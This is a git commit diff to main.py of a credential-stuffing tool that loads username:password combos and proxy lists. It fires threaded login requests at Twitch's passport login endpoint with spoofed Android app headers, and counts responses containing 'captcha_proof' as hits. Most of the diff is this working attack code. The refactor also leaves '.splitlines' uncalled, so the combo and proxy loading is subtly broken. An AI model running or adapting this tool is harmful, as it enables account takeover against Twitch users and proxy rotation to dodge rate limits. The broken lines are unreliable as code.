4c9f16f036bd6ecddd7e8c1e5fcf70964e599fe3
Tekky <98614666+xtekky@users.noreply.github.com>
2022-06-20 00:25:15 +0200

    Update main.py

--- main.py
+++ main.py
@@ -4,20 +4,14 @@ import threading, time, requests
 
 class Brute:
     def __init__(self):
-        self.login = requests.post
+        self.login   = requests.post
 
-        self.rates = 0
-        self.hits = 0
-        self.errors = 0
+        self.rates   = 0
+        self.hits    = 0
+        self.errors  = 0
 
-        self.combos = []
-        self.proxies = []
-
-        for _ in open('./files/proxies.txt', 'r'):
-            self.proxies.append(_.rstrip())
-
-        for _ in open('./files/combos.txt', 'r'):
-            self.combos.append(_.rstrip())
+        self.combos  = open('./files/combos.txt', 'r').read().splitlines
+        self.proxies = open('./files/proxies.txt', 'r').read().splitlines
 
         for _ in self.combos:
             threading.Thread(target=self.bruter, args=(_,)).start()
@@ -31,30 +25,29 @@ class Brute:
 
         proxy = random.choice(self.proxies)
 
-        DATA_V1 = {
-            "username": username,
-            "password": password,
-            "client_id": "kimne78kx3ncx6brgo4mv6wki5h1ko",
-            "undelete_user": False
-        }
-
-        PARAMS_V1 = {
-            "content-type": "application/json; charset=UTF-8",
-            "host": "passport.twitch.tv",
-            "connection": "Keep-Alive",
-            "accept-encoding": "gzip",
-            "client-id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
-            "accept": "application/vnd.twitchtv.v3+json",
-            "accept-language": "en-us",
-            "user-agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G973N Build/PPR1.190810.011) tv.twitch.android.app/13.0.0/1300000"
-        }
-
-        PROXY_V1 = {
-               'http': proxy,
-               'https': proxy,
-            }
-
-        response = self.login("https://passport.twitch.tv/login", json=DATA_V1, headers=PARAMS_V1, proxies=PROXY_V1)
+        response = self.login(
+                url = "https://passport.twitch.tv/login", 
+                json = {
+                    "username": username,
+                    "password": password,
+                    "client_id": "kimne78kx3ncx6brgo4mv6wki5h1ko",
+                    "undelete_user": False
+                }, 
+                headers={
+                    "content-type": "application/json; charset=UTF-8",
+                    "host": "passport.twitch.tv",
+                    "connection": "Keep-Alive",
+                    "accept-encoding": "gzip",
+                    "client-id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
+                    "accept": "application/vnd.twitchtv.v3+json",
+                    "accept-language": "en-us",
+                    "user-agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G973N Build/PPR1.190810.011) tv.twitch.android.app/13.0.0/1300000"
+                }, 
+                proxies = {
+                   'http': f'http://{proxy}',
+                   'https': f'http://{proxy}'
+                }
+        )
 
         if "captcha_proof" in response.text:
             self.hits += 1
